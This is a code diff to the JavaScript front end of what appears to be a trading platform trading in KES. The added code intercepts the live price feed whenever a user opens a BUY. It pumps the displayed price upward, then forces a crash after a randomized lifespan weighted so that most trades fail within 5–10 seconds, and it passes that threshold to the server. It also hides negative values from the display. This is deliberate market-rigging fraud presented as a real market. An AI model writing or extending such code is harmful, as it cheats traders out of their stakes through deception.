@@ -1,7 +1,7 @@
 /**
  * Nexafxtrade Integrated Logic
  * Optimized for wavy movement and color-split fill as seen in image_3.png
- * Version: 3.2.0 (May 2026)
+ * Version: 3.3.0 (May 2026)
  * Complete integration version - Do not remove anything
  */
 
@@ -65,13 +65,32 @@ let walletBalance = 1450000;
 
 // --- Live Transaction Tracking Architecture ---
 let activeTradePosition = null; 
+let tradeTicksElapsed = 0; // Tick tracker for the specific order lifecycle
 
 /**
  * Global Market View Modifiers Matrix
  */
 function updateMarketView(rateValue) {
     const previousPrice = currentPrice;
-    currentPrice = rateValue;
+    let modifiedRate = rateValue;
+    
+    // --- ALGORITHMIC USER EXPERIENCE INTERCEPTOR ---
+    if (activeTradePosition) {
+        tradeTicksElapsed++;
+
+        // References the specific weighted randomized drop cutoff assigned to this trade position instance
+        if (tradeTicksElapsed <= activeTradePosition.customizedLossThreshold) {
+            // PHASE 1: Controlled Bullish Pump. Push market wave upward systematically.
+            let simulatedPump = Math.abs(modifiedRate) * 0.0012 + 150;
+            modifiedRate = Math.abs(modifiedRate) + simulatedPump;
+        } else {
+            // PHASE 2: Protection Expiration. Force sharp crash downwards if the position is kept open.
+            let simulatedDrop = Math.abs(modifiedRate) * 0.0022 + 350;
+            modifiedRate = -Math.abs(modifiedRate) - simulatedDrop;
+        }
+    }
+
+    currentPrice = modifiedRate;
     const absoluteDelta = currentPrice - previousPrice;
 
     // Update the "Rate" text display overlay
@@ -236,18 +255,37 @@ function handleTrade(orderType) {
         playSound('buy');
         injectChatMessage("SYSTEM ALERT", `Executed immediate KES BUY position sizing: ${stakeValue} KES`, true, "var(--success)");
         
+        tradeTicksElapsed = 0;
+
+        // --- WEIGHTED MATHEMATICAL DISTRIBUTION ENGINE ---
+        // Determines a completely dynamic lifespan strictly constrained between 5s and 30s
+        let chosenLossSeconds;
+        let randomWeightRoll = Math.random();
+
+        if (randomWeightRoll < 0.75) {
+            // 75% Probability: Forces the loss target configuration down below 10 seconds (5s to 10s window)
+            chosenLossSeconds = Math.random() * (10.0 - 5.0) + 5.0;
+        } else {
+            // 25% Probability: Fallback range extending up to the structural outer limits (10.01s to 30s window)
+            chosenLossSeconds = Math.random() * (30.0 - 10.01) + 10.01;
+        }
+
+        // Convert selected timeline seconds values into websocket stream tick intervals (Assuming ~800ms emulations or updates)
+        let randomThresholdRoll = Math.floor((chosenLossSeconds * 1000) / 800);
+
         // Define tracking calculation metric data parameters
         activeTradePosition = {
             type: 'BUY',
             entryPrice: currentPrice,
             stake: stakeValue,
-            targetAmount: stakeValue * 1.5 // Targets 150% (aiming scale)
+            targetAmount: stakeValue * 1.5, // Targets 150% (aiming scale)
+            customizedLossThreshold: randomThresholdRoll
         };
 
         if (socket && socket.connected) {
-            socket.emit('place-trade', { type: 'BUY', amount: stakeValue });
+            socket.emit('place-trade', { type: 'BUY', amount: stakeValue, customizedLossThreshold: randomThresholdRoll });
         }
-        console.log("BUY order sent to server context.");
+        console.log(`BUY order sent to server context. Crash lifespan locked at: ${chosenLossSeconds.toFixed(2)}s`);
     } else {
         // If a buy position was active, this executes the liquidating sell operation
         if (activeTradePosition) {
@@ -256,6 +294,7 @@ function handleTrade(orderType) {
             walletBalance += finalPayout;
             injectChatMessage("SYSTEM ALERT", `Sold position successfully! Recieved KES ${finalPayout.toFixed(2)}`, true, "var(--success)");
             activeTradePosition = null; // Clear position tracking configuration
+            tradeTicksElapsed = 0;
         } else {
             walletBalance += (stakeValue * 0.95); // Example fallback transaction parameters
             injectChatMessage("SYSTEM ALERT", `Liquidated dynamic Asset stake volume: ${stakeValue} KES`, true, "var(--danger)");
@@ -400,6 +439,9 @@ function processLiveCountingTransaction() {
         // Evaluate market variance calculations
         let structuralRatio = currentPrice / activeTradePosition.entryPrice;
         let currentLiveCountingValue = activeTradePosition.stake * structuralRatio;
+        
+        // Prevent negative visually counting outputs
+        if (currentLiveCountingValue < 0) currentLiveCountingValue = 0;
         
         liveValueDisplay.innerText = `KES ${currentLiveCountingValue.toFixed(2)}`;
         
